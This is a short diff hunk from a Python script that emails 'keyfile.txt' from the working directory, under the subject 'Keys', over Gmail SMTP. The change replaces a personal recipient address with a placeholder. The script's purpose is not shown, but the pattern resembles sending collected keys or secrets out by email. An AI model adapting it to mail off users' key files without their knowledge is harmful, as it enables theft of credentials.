@@ -70,7 +70,7 @@ def main():
     subject = "Keys"
     attachment_path = os.path.join(os.getcwd(), "keyfile.txt")
     body = "This is an email sent from Python."
-    to_email = "seanlatrigne@gmail.com"
+    to_email = "example@gmail.com"
     smtp_server = "smtp.gmail.com"
     smtp_port = 587
     sender_email = "example@gmail.com"
